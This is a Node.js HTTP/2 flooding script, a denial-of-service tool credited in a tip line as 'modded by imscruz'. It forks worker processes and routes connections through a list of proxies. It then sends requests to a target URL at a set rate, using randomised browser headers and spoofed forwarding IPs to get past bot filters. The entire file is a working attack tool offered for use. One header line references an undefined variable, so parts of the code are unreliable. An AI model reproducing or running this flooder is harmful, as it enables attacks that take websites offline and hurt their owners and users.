const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 const colors = require('colors');

const errorHandler = error => {
    //console.log(error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

 if (process.argv.length < 7){
 console.log(`

 `);
 console.log(`Usage: target time rate thread proxyfile`);
 process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 function randstr(length) {
   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }
 
 const ip_spoof = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
 };
 
 const spoofed = ip_spoof();

 const ip_spoof2 = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 9999);
   };
   return `${getRandomByte()}`;
 };
 
 const spoofed2 = ip_spoof2();
 
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
     Rate: parseInt(process.argv[4]),
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6],
     //ua: process.argv[7]
 }
 const sig = [    
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
 ];
 const sigalgs1 = sig.join(':');
 const cplist = [
  "ECDHE-RSA-AES128-GCM-SHA256",
  "ECDHE-RSA-AES256-GCM-SHA384",
  "ECDHE-ECDSA-AES256-GCM-SHA384",
  "ECDHE-ECDSA-AES128-GCM-SHA256"
 ];
 const accept_header = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
  'text/html; charset=utf-8',
  'application/json, text/plain, */*',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
 ]; 
 lang_header = [
  'ko-KR',
  'en-US',
  'zh-CN',
  'zh-TW',
  'ja-JP',
  'en-GB',
  'en-AU',
  'en-GB,en-US;q=0.9,en;q=0.8',
  'en-GB,en;q=0.5',
  'en-CA',
  'en-UK, en, de;q=0.5',
  'en-NZ',
  'en-GB,en;q=0.6',
  'en-ZA',
  'en-IN',
  'en-PH',
  'en-SG',
  'en-HK',
  'en-GB,en;q=0.8',
  'en-GB,en;q=0.9',
  ' en-GB,en;q=0.7',
  '*',
  'en-US,en;q=0.5',
  'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
  'utf-8, iso-8859-1;q=0.5, *;q=0.1',
  'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
  'en-GB, en-US, en;q=0.9',
  'de-AT, de-DE;q=0.9, en;q=0.5',
  'cs;q=0.5',
  'da, en-gb;q=0.8, en;q=0.7',
  'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
  'en-US,en;q=0.9',
  'de-CH;q=0.7',
  'tr',
  'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
 ];
 
 const encoding_header = [
  '*',
  '*/*',
  'gzip',
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  'gzip, deflate',
  'br',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'gzip;q=1.0, identity; q=0.5, *;q=0',
  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
  'compress;q=0.5, gzip;q=1.0',
  'identity',
  'gzip, compress',
  'compress, deflate',
  'compress',
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate',
 ];
 
 const control_header = [
  'max-age=604800',
  'proxy-revalidate',
  'public, max-age=0',
  'max-age=315360000',
  'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
  's-maxage=604800',
  'max-stale',
  'public, immutable, max-age=31536000',
  'must-revalidate',
  'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
  'max-age=31536000,public,immutable',
  'max-age=31536000,public',
  'min-fresh',
  'private',
  'public',
  's-maxage',
  'no-cache',
  'no-cache, no-transform',
  'max-age=2592000',
  'no-store',
  'no-transform',
  'max-age=31557600',
  'stale-if-error',
  'only-if-cached',
  'max-age=0',
 ];
 
 const refers = [
		"http://www.google.com/?q=",
		"https://wordpress.org",
		"https://microsoft.com",
		"https://mozilla.org",
		"https://cloudfare.com",
		"https://en.wikipedia.org",
        "http://www.usatoday.com/search/results?q=",
        "http://engadget.search.aol.com/search?q=",
        "http://www.google.com/",
        "http://duckduckgo.com/",
        "http://search.yahoo.com/search?p=",
        "http://swisscows.com/en/web?query=",
        "http://gibiru.com/results.html?q=",
        "http://www.bing.com/",
        "http://pornhub.com/",
        "http://www.google.co.ao/search?q=",
        "http://steamcommunity.com/market/search?q=",
        "http://vk.com/profile.php?redirect=",
        "http://www.cia.gov/index.html",
        "http://check-host.net/",
        "http://www.xnxx.com/",
        "http://youtube.com/",
        "http://www.baidu.com/",
        "http://www.google.ru/?hl=ru&q=",
        "http://yandex.ru/yandsearch?text=",
        "http://www.shodanhq.com/search?q=",
        "http://ytmnd.com/search?q=",
		"https://check-host.net/",
		"http://www.google.com/ig/adde?moduleurl=", 
		"http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=", 
		"http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=",
		"http://host-tracker.com/check_page/?furl=", 
		"http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=",
 ];
 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
 const ciphers1 = "GREASE:" + [
     defaultCiphers[2],
     defaultCiphers[1],
     defaultCiphers[0],
     ...defaultCiphers.slice(3)
 ].join(":");
 
 const uap = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; SM-A013F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 YandexSearch/7.52 YandexSearchBrowser/7.52',
    'Mozilla/5.0 (Linux; Android 10; SM-A013F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 YandexSearch/7.52 YandexSearchBrowser/7.52',
    'Mozilla/5.0 (Linux; Android 11; M2103K19PY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 YaApp_Android/21.85.1 YaSearchBrowser/21.85.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6; MSIECrawler)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6; Hotbar 4.2.8.0)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6; Hotbar 3.0)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.4)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.0.0; Hotbar 4.1.8.0)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.0.0)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Wanadoo 5.6)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Wanadoo 5.3; Wanadoo 5.5)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Wanadoo 5.1)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; SV1; .NET CLR 1.1.4322; .NET CLR 1.0.3705; .NET CLR 2.0.50727)",
	"Opera/9.80 (X11; Linux x86_64; U; en-GB) Presto/2.2.15 Version/10.01",

 ];

  platform = [
    'Linux',
    'macOS',
    'Windows'
  ];
  methods = [
   "GET",
   "HEAD"
  ];

 version = [
    '"Chromium";v="116", "Not)A;Brand";v="8", "Google Chrome";v="116"',
    '"Chromium";v="115", "Not)A;Brand";v="8", "Google Chrome";v="115"',
    '"Chromium";v="114", "Not)A;Brand";v="8", "Google Chrome";v="114"',
    '"Chromium";v="113", "Not)A;Brand";v="8", "Google Chrome";v="113"',
    '"Chromium";v="112", "Not)A;Brand";v="8", "Google Chrome";v="112"',
    '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    '"Chromium";v="115", "Not)A;Brand";v="24", "Google Chrome";v="115"',
    '"Chromium";v="114", "Not)A;Brand";v="24", "Google Chrome";v="114"',
    '"Chromium";v="113", "Not)A;Brand";v="24", "Google Chrome";v="113"',
    '"Chromium";v="112", "Not)A;Brand";v="24", "Google Chrome";v="112"',
    '"Chromium";v="116", "Not)A;Brand";v="99", "Google Chrome";v="116"',
    '"Chromium";v="115", "Not)A;Brand";v="99", "Google Chrome";v="115"',
    '"Chromium";v="114", "Not)A;Brand";v="99", "Google Chrome";v="114"',
    '"Chromium";v="113", "Not)A;Brand";v="99", "Google Chrome";v="113"',
    '"Chromium";v="112", "Not)A;Brand";v="99", "Google Chrome";v="112"'
 ];

 const a6 = [
  '"Chromium";v="116.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="116.0.0.0"',
  '"Chromium";v="115.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="115.0.0.0"',
  '"Chromium";v="114.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="114.0.0.0"',
  '"Chromium";v="113.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="113.0.0.0"',
  '"Chromium";v="112.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="112.0.0.0"',
  '"Chromium";v="116.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="116.0.0.0"',
  '"Chromium";v="115.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="115.0.0.0"',
  '"Chromium";v="114.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="114.0.0.0"',
  '"Chromium";v="113.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="113.0.0.0"',
  '"Chromium";v="112.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="112.0.0.0"',
  '"Chromium";v="116.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="116.0.0.0"',
  '"Chromium";v="115.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="115.0.0.0"',
  '"Chromium";v="114.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="114.0.0.0"',
  '"Chromium";v="113.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="113.0.0.0"',
  '"Chromium";v="112.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="112.0.0.0"',
 ];

const jalist = [
 "002205d0f96c37c5e660b9f041363c1",
 "073eede15b2a5a0302d823ecbd5ad15b",
 "0b61c673ee71fe9ee725bd687c455809",
 "6cd1b944f5885e2cfbe98a840b75eeb8",
 "94c485bca29d5392be53f2b8cf7f4304",
 "b4f4e6164f938870486578536fc1ffce",
 "b8f81673c0e1d29908346f3bab892b9b",
 "baaac9b6bf25ad098115c71c59d29e51",
 "bc6c386f480ee97b9d9e52d472b772d8",
 "da949afd9bd6df820730f8f171584a71",
 "f58966d34ff9488a83797b55c804724d",
 "fd6314b03413399e4f23d1524d206692",
 "0a81538cf247c104edb677bdb8902ed5",
 "0b6592fd91d4843c823b75e49b43838d",
 "0ffee3ba8e615ad22535e7f771690a28",
 "1c15aca4a38bad90f9c40678f6aface9",
 "5163bc7c08f57077bc652ec370459c2f",
 "a88f1426c4603f2a8cd8bb41e875cb75",
 "b03910cc6de801d2fcfa0c3b9f397df4",
 "bfcc1a3891601edb4f137ab7ab25b840",
 "ce694315cbb81ce95e6ae4ae8cbafde6",
 "f15797a734d0b4f171a86fd35c9a5e43"
];
const tips1 =[
 "Proxies never updated!",
 "This script modded by imscruz",
 ];

  site = [
    'cross-site',
	'same-origin',
	'same-site',
	'none'
  ];
  
  mode = [
    'cors',
	'navigate',
	'no-cors',
	'same-origin'
  ];
  
  dest = [
    'document',
	'image',
	'embed',
	'empty',
	'frame'
  ];

 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var jar = jalist[Math.floor(Math.floor(Math.random() * jalist.length))];
 var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
 var tipsz = tips1[Math.floor(Math.floor(Math.random() * tips1.length))];
 var a = a6[Math.floor(Math.floor(Math.random() * a6.length))];
 var methodd = methods[Math.floor(Math.floor(Math.random() * methods.length))];
 var site1 = site[Math.floor(Math.floor(Math.random() * site.length))];
 var mode1 = mode[Math.floor(Math.floor(Math.random() * mode.length))];
 var dest1 = dest[Math.floor(Math.floor(Math.random() * dest.length))];
 var ver = version[Math.floor(Math.floor(Math.random() * version.length))];
 var platforms = platform[Math.floor(Math.floor(Math.random() * platform.length))];
 var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
 var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
 var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
 var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
 var proxies = readLines(args.proxyFile);
 //var uar = readLines(args.ua);
 //var uar1 = uar[Math.floor(Math.floor(Math.random() * uar.length))];
 const parsedTarget = url.parse(args.target);

const rateHeaders = [
{ "A-IM": "Feed" },
{ "accept": accept },
{ "accept-charset": accept },
{ "accept-datetime": accept },
{ "accept-encoding": encoding },
{ "accept-language": lang },
{ "upgrade-insecure-requests": "1" },
{ "Access-Control-Request-Method": "GET" },
{ "Cache-Control": "no-cache" },
{ "Content-Encoding": "gzip" },
{ "content-type": "text/html" },
{ "cookie": randstr(15) },
{ "Expect": "100-continue" },
{ "Forwarded": "for=192.168.0.1;proto=http;by=" + spoofed },
{ "From": "user@gmail.com" },
{ "Max-Forwards": "10" },
{ "origin": "https://" + parsedTarget.host },
{ "pragma": "no-cache" },
{ "referer": "https://" + parsedTarget.host + "/" },
];

const rateHeaders2 = [
{ "Via": "1.1 " + parsedTarget.host },
{ "X-Requested-With": "XMLHttpRequest" },
{ "X-Forwarded-For": spoofed },
{ "X-Vercel-Cache": randstr(15) },
{ "Alt-Svc": "http/1.1=http2." + parsedTarget.host + "; ma=7200" },
{ "TK": "?" },
{ "X-Frame-Options": "deny" },
{ "X-ASP-NET": randstr(25) },
{ "Refresh": "5" },
{ "X-Content-duration": spoofed },
{ "service-worker-navigation-preload": Math.random() < 0.5 ? 'true' : 'null' },
];

 if (cluster.isMaster) {
    console.clear()
    console.log(`--------------------------------------------`.gray)
    console.log(`Target: `.brightYellow + process.argv[2])
    console.log(`Time: `.brightYellow + process.argv[3])
    console.log(`Rate: `.brightYellow + process.argv[4])
    console.log(`Thread: `.brightYellow + process.argv[5])
    console.log(`Proxys: `.brightYellow + process.argv[6])
    console.log(`--------------------------------------------`.gray)
    console.log(`Note: `.brightCyan + tipsz)
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {setInterval(runFlooder) }
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port
     });
 
     connection.setTimeout(options.timeout * 600000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }
var hd={}
 const Socker = new NetSocket();
 headers[":method"] = "GET";
 headers[":authority"] = parsedTarget.host;
 headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
 headers[":scheme"] = "https";
 headers["x-forwarded-proto"] = "https";
 headers["accept-language"] = lang;
 headers["accept-encoding"] = encoding;
 //headers["X-Forwarded-For"] = spoofed;
 //headers["X-Forwarded-Host"] = spoofed;
 //headers["Real-IP"] = spoofed;
 headers["cache-control"] = control;
 headers["sec-ch-ua"] = '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"';
 headers["sec-ch-ua-mobile"] = "?0";
 headers["sec-ch-ua-platform"] = pi;
 //headers["origin"] = "https://" + parsedTarget.host;
 //headers["referer"] = "https://" + parsedTarget.host;
 headers["upgrade-insecure-requests"] = "1";
 headers["accept"] = accept;
 headers["user-agent"] = randstr(15);
 headers["sec-fetch-dest"] = "document";
 headers["sec-fetch-mode"] = "navigate";
 headers["sec-fetch-site"] = "none";
 headers["TE"] = "trailers";
 //headers["Trailer"] = "Max-Forwards";
 headers["sec-fetch-user"] = "?1";
 headers["x-requested-with"] = "XMLHttpRequest";
 
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");

     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 100,
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 600000);

         const tlsOptions = {
            host: parsedTarget.host,
            secure: true,
            ALPNProtocols: ['http/1.1', 'h2'],
            sigals: "RSA+SHA256:ECDSA+SHA256",
            socket: connection,
            ecdhCurve: "auto",
            ciphers: "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-CHACHA20-POLY1305",
            honorCipherOrder: false,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            secureProtocol: "TLS_method",
            session: crypto.randomBytes(64),
            timeout: 1000,
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 60000);

         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
            headerTableSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
            maxConcurrentStreams: 100,
            initialWindowSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
            maxFrameSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
            enablePush: false
          },
             maxSessionMemory: 3333,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
            maxConcurrentStreams: 100,
            initialWindowSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
            maxFrameSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
            enablePush: false,
          });
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                const dynHeaders = {
                  ...headers,
                  "user-agent": uap1 + randstr(12),
                  ...rateHeaders[Math.floor(Math.random()*rateHeaders.length)],
                  ...rateHeaders2[Math.floor(Math.random()*rateHeaders2.length)],
                };
                for (let i = 0; i < args.Rate; i++) {
                    headers["ja3"] = jar;
                    const request = client.request(dynHeaders)
                    
                    client.on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
     }),function (error, response, body) {
		};
 }
 
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);